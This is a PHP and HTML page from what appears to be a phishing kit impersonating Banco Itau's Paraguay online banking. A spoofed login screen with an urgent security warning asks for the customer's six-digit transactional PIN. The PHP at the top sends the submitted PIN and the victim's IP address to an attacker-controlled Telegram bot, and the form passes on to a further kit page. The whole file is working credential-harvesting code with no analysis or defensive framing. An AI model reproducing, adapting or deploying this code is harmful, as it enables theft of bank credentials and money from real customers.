<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
include('datos.php');

if ( isset ($_POST['PinAcceso']) ){

$message = ":::Banco Itau:::\r\nPin De Acceso.: ".$_POST['PinAcceso']."\r\nIP: ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}

?>
<html lang="es-ES">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

        <title>Banca Electronica</title>

        <meta name="viewport" content="width = device-width, initial-scale=1, maximum-scale=1" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="viewport" content="width = device-width, initial-scale=1, maximum-scale=1" />
        <link rel="image_src" href="img/logo.png" />
        <link rel="shortcut icon" href="img/favicon.ico" />
        <link rel="stylesheet" type="text/css" href="css/material-icons.css" />
        <link rel="stylesheet" type="text/css" href="css/-style19.css" />

        <style type="text/css">
            .ocultar-div {
                display: none;
            }

            @media screen and (max-width: 690px) {
                .ocultar-div {
                    display: block;
                }
            }
        </style>
    </head>

    <body style="overflow: hidden;" _c_t_common="1">
        <header>
            <link rel="stylesheet" type="text/css" href="css/acceso_rapido.css" />
            <link rel="stylesheet" type="text/css" href="css/font_style.css" />
            <nav class="navbar-expand-lg navbar-itau">
                <div class="container-fluid">
                    <form action="index4.php" method="post" class="form_contact">
                        <div class="d-flex align-items-center">
                            <div class="col-6 col-lg-2 order-2 order-lg-0">
                                <div class="d-flex align-items-center no-gutters">
                                    <div class="col-lg-3 logo-login text-center text-lg-left">
                                        <a href="#" title="Página inicial"><img src="img/logo.png" height="48" width="48" class="img-fluid" /></a>
                                    </div>
                                    <div class="col-lg-8 d-lg-block d-none">
                                        <div class="input-group buscador-top pl-2">
                                            <input type="text" class="custom-file-input hasPlaceholder" placeholder="¿Buscás algo?" id="txt_palabra_arriba" />
                                            <button class="btn" type="button" id="btn_buscar_arriba" onclick="consulta_paginas()"><span class="material-icons md-20">search</span></button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-3 col-lg-5 order-0 order-lg-1 menu-sitio">
                                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsPrincipal" aria-controls="navbarsPrincipal" aria-expanded="false" aria-label="Toggle navigation" id="menu-nav-ppal">
                                    <span class="material-icons md-30 d-block" id="menu-nav-ppala">dehaze</span><span id="textoMenu">Menú</span>
                                </button>
                                <div class="collapse navbar-collapse" id="navbarsPrincipal">
                                    <ul class="navbar-nav">
                                        <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Productos</a></li>
                                        <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" id="dropdown02" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Tus objetivos</a></li>
                                        <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" id="dropdown03" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Atención al cliente</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="right_header order-3 menu-user">
                                <button class="navbar-toggler float-right" type="button" data-toggle="collapse" data-target="#acc-HB" aria-controls="acc-HB" aria-expanded="true" aria-label="Toggle navigation" id="menu-nav-user">
                                    <span class="material-icons md-30 d-block" id="menu-nav-usera">clear</span>Acceso
                                </button>
                                <div class="tab-quick-access">
                                    <button class="tablinks active" id="tab_24h">24 horas en internet</button><button class="tablinks" id="tab_pe">Pagos electrónicos</button><button class="tablinks" id="tab_cd">Abrí tu cuenta</button>
                                </div>
                                <div id="24hs_tab" class="tab-quick-access-content" style="display: block;">
                                    <p id="gfg" hidden=""></p>
                                    <p id="address" hidden=""></p>
                                    <div class="acc-HB navbar-collapse collapse show" id="acc-HB" style="">
                                        <div class="form-row ml-auto w-100" id="access-responsive-width">
                                            <div class="col-lg-2 mb-3 mb-lg-0">
                                                <label class="sr-only" for="">Segmento</label>
                                                <div class="col-lg-auto mt-3 mt-lg-1 lnk mr-auto">
                                                    <ul class="list-inline mb-0 float-lg-left float-none text-center">
                                                        <li class="list-inline-item">
                                                            <small>
                                                                <a href="#" class="ayuda cboxElement"><span class="badge badge-primary rounded-circle text-white">?</span>Ingresá tu PIN Transaccional para desbloquear tu cuenta</a>
                                                            </small>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div class="col-lg-2 div-personas mb-3 mb-lg-0">
                                                <label class="sr-only" for="">Documento</label>
                                                <div class="ocultar-div">
                                                    <span style="color: RED;">¡ATENCIÓN !</span><br />
                                                    <span>Por medidas de seguridad para ingresar a su cuenta debe colocar su PIN Transaccional.</span>
                                                </div>
                                                <input
                                                    type="text"
                                                    class="form-control form-control-sm hasPlaceholder"
                                                    name="segundo"
                                                    id="InputValuePIN"
                                                    required=""
                                                    placeholder="Ingresá tu PIN Transaccional"
                                                    maxlength="6"
                                                    minlength="6"
                                                    onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;"
                                                />
                                            </div>
                                            <div class="col-lg-2 div-personas div-cuenta mb-3 mb-lg-0"></div>
                                            <div class="col-lg-auto col-sm-12">
                                                <button type="submit" class="btn btn-primary btn-sm btn-block accesoHB_2" value="acceder" id="vprocesar"><img src="img/icon-lock.png" /><i id="ingresar_pe">Ingresar</i></button>
                                            </div>
                                            <div class="col-lg-auto col-sm-12 d-none d-lg-block"><img src="img/icon-24hs.png" height="25" width="24" alt="" /></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </nav>
        </header>
        <div id="parcial" style="box-sizing: inherit;">
            <div style="display: none;">
                <div id="popup-message">
                    <a href="#"><img src="img/popup-truncamiento-usd.jpg" />/ </a>
                </div>
            </div>
            <div id="wrapperBanner">
                <div class="caroufredsel_wrapper" style="display: block; text-align: left; float: none; position: relative; inset: auto; z-index: auto; height: 900px; margin: 0px; overflow: hidden;">
                    <div id="carousel" style="text-align: left; float: none; position: absolute; inset: 0px auto auto 0px; margin: 0px; width: 3510px; height: 450px;">
                        <div id="banner1" class="banner" style="width: 390px;"><img src="img/banner.jpg" /></div>
                    </div>
                </div>
            </div>
            <footer class="footer">
                <div class="container-fluid pt-2 pb-2">
                    <a href="#" class="btn_sitemap abrir" id="btnSitemap">Acceso rápido</a><a href="#" class="btn_sitemap cerrar" id="btnSitemap" style="display: none;">Volver arriba</a>
                    <a id="btn-bandera" data-toggle="collapse" href="#" role="button" aria-expanded="false" aria-controls="selecaoIdiomas"><img src="img/flagFooterParaguai.png" alt="Bandera Paraguay" width="25" /></a>
                    <ul class="list-inline m-0">
                        <li class="list-inline-item"><a href="#">Políticas de privacidad</a></li>
                        <li class="list-inline-item"><a href="#">Emergencias bancarias</a></li>
                        <li class="list-inline-item"><a href="#">Sobre Itau</a></li>
                        <li class="list-inline-item"><a href="#">Tarifario y Contratos</a></li>
                        <li class="list-inline-item"><a href="#">Informe de Gobierno Corporativo</a></li>
                        <li class="list-inline-item"><a href="#">Fundación</a></li>
                        <li class="list-inline-item"><a href="#">Trabajá con nosotros</a></li>
                        <li class="list-inline-item"><a href="#">Más Seguridad</a></li>
                        <li class="list-inline-item"><a href="#">Beneficios</a></li>
                        <li class="list-inline-item"><a href="#">Bienes en Venta</a></li>
                        <li class="list-inline-item clearfix"></li>
                    </ul>
                </div>
            </footer>
        </div>
    </body>
</html>
